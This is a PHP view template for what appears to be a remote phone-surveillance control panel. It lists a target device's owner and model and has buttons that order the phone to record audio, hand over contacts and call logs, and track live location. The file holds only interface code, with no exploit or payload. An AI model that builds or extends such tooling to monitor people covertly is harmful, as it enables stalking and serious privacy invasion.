<?php
$this->load->view('layout/header');
$this->load->view('layout/topmenu');
$userdata = $this->session->userdata('logged_in');
?>
<style>
    .iconblock i{
        font-size: 40px;
        margin: 5px;
    }
    .controlblock{
        border: 3px solid #d9e0e7;
        padding: 5px;
        height: 180px;
    }
    .controlblock.active{
        border: 3px solid green;
    }

    .controlblock button{
        margin-bottom: 10px;
    }
    .activebutton{
        color:red;
        position: absolute;
        left: 25px;
        color:white;
    }
    .blink_me {
        color:green;
        animation: blinker 1s linear infinite;
    }

    @keyframes blinker {
        50% {
            opacity: 0;
        }
    }
</style>
<!-- ================== BEGIN PAGE LEVEL STYLE ================== -->
<!-- ================== END PAGE LEVEL STYLE ================== -->
<div id="content" class="content" ng-controller="commandControlDashboard" >
    <!-- begin breadcrumb -->
    <ol class="breadcrumb pull-right">
        <li><a href="javascript:;">Home</a></li>
        <li class="active">Contact List</li>
    </ol>
    <!-- end breadcrumb -->
    <!-- begin page-header -->
    <h1 class="page-header">
        <?php
        if ($contactperson) {
            echo $contactperson['name'] . ", " . $contactperson['contact_no'] . " - ";
        }
        if ($contactperson) {

            echo "Brand: " . $contactperson['brand'] . "| Model No:" . $contactperson['model_no'] . " | " . $contactperson['device_id'];
        }
        ?>
    </h1>
    <!-- end page-header -->

    <div class="row">

        <div class="panel panel-default">
            <div class="panel-body">

                <?php
                $commandlist = [
                    array("title" => "Sound Record", "command" => "sound_record",
                        "modal" => 'data-toggle="modal" data-target="#opentimemodel"',
                        "formtype" => ' name="send_command" value="sendCommand" type="button"',
                        "timing" => "fixed_time", "icon" => "fa fa-headphones"),
                    array("title" => "Get Contacts", "command" => "contact_list",
                        "modal" => "",
                        "formtype" => ' name="send_command" value="sendCommand" type="submit"',
                        "timing" => "bool", "icon" => "fa fa-group"),
                    array("title" => "Get Contacts Log", "command" => "contact_log",
                        "modal" => "",
                        "formtype" => ' name="send_command" value="sendCommand" type="submit"',
                        "timing" => "bool", "icon" => "fa fa-phone"),
                    array("title" => "Location Tracking", "command" => "live_location",
                        "modal" => "",
                        "formtype" => ' name="send_command" value="sendCommand" type="submit"',
                        "timing" => "bool", "icon" => "fa fa-map-marker"),
                ];
                foreach ($commandlist as $key => $value) {
                    $checkactive = false;
                    $commandattr = array();
                    if (isset($command_list[$value["command"]])) {
                        $commandattr = $command_list[$value["command"]];
                        $checkactive = $commandattr["status"] == "200";
                    }
                    ?>
                    <div class="col-md-2 text-center">
                        <form action="" method="post">
                            <div class="controlblock <?php echo $checkactive?'active':'';?>">
                                <input type="hidden" name="command" value="<?php echo $value["command"]; ?>">
                                <input type="hidden" name="timing" value="<?php echo $value["timing"]; ?>">
                                <i class="fa fa-circle activebutton <?php echo $checkactive ? 'blink_me' : ''; ?>"></i>
                                <div class="iconblock "><i class="<?php echo $value["icon"]; ?> fa-2x"></i></div>
                                <button <?php echo $value["modal"]; ?>
                                <?php echo $value["formtype"]; ?>
                                    class="btn btn-success btn-block" ng-click="setCommand('<?php echo ($value["title"]); ?>', '<?php echo ($value["command"]); ?>')"> <?php echo $value["title"]; ?></button>
                                    <?php
                                    if ($value["timing"] == "bool") {
                                        $onoff = array("on" => "On", "off" => "Off");
                                        ?>
                                    <select class="form-control" name="attr">
                                        <?php
                                        foreach ($onoff as $key2 => $value2) {
                                            ?>
                                            <option value="<?php echo $key2; ?>"
                                            <?php
                                            if ($checkactive) {
                                                echo $commandattr['attr'] == $key2 ? "selected" : "";
                                            }
                                            ?>
                                                    ><?php echo $value2; ?></option>
                                                <?php }
                                                ?>
                                    </select>
                                    <?php
                                } else {
                                    $timingarray = array(
                                        "10000" => "10 Minutes",
                                        "15000" => "15 Minutes",
                                        "20000" => "20 Minutes",
                                        "30000" => "30 Minutes",
                                        "40000" => "40 Minutes",
                                        "60000" => "60 Minutes",
                                    );
                                    ?>
                                    <select class="form-control" name="attr">
                                        <?php
                                        foreach ($timingarray as $key2 => $value2) {
                                            ?>
                                            <option value="<?php echo $key2; ?>"
                                            <?php
                                            if ($checkactive) {
                                                echo $commandattr['attr'] == $key2 ? "selected" : "";
                                            }
                                            ?>
                                                    ><?php echo $value2; ?></option>
                                                <?php }
                                                ?>
                                    </select>

                                    <?php
                                }
                                if ($checkactive) {
                                    ?>
                                    <p>
                                        Started Date/Time<br/>
                                        <b>
                                            <?php echo $commandattr["date"] . " " . $commandattr["time"] ?>
                                        </b>
                                    </p>
                                    <?php
                                }
                                else{
                                    echo "<p>Service </br>Not Active</p>";
                                }
                                ?>

                            </div>
                        </form>
                    </div>
                    <?php
                }
                ?>
            </div>
        </div>
    </div>
    <!-- Modal -->
    <div class="modal fade" id="opentimemodel" tabindex="-1" role="dialog" aria-labelledby="changePassword">
        <div class="modal-dialog modal-sm" role="document">
            <div class="modal-content">
                <form action="#" method="post">
                    <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                        <h4 class="modal-title" id="myModalLabel">{{selectCommand.title}}</h4>
                    </div>
                    <div class="modal-body">
                        <div class="form-group">
                            <input type="hidden" name="command" value="{{selectCommand.command}}">
                            <input type="hidden" name="timing" value="fixed_time">
                            <label for="exampleInputEmail1">Set Timing</label>
                            <select class="form-control" name="attr">
                                <?php
                                $timingarray = array(
                                    "10000" => "10 Minutes",
                                    "15000" => "15 Minutes",
                                    "20000" => "20 Minutes",
                                    "30000" => "30 Minutes",
                                    "40000" => "40 Minutes",
                                    "60000" => "60 Minutes",
                                );
                                foreach ($timingarray as $key => $value) {
                                    ?>
                                    <option value="<?php echo $key; ?>"><?php echo $value; ?></option>
                                <?php }
                                ?>
                            </select>
                        </div>

                    </div>


                    <div class="modal-footer">
                        <button type="submit" name="send_command" value="sendCommand" class="btn btn-primary">Send Command</button>

                        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>
<?php
$this->load->view('layout/footer');
?>
<script src="<?php echo base_url(); ?>assets/angular/command.js"></script>


<?php
$this->load->view('layout/footer');
?> 

<script>
                                $(document).ready(function () {
                                    $("#myform").submit(function (event) {
                                        if (!confirm('Are you sure that you want delete record.'))
                                            event.preventDefault();
                                    });
                                });


</script>
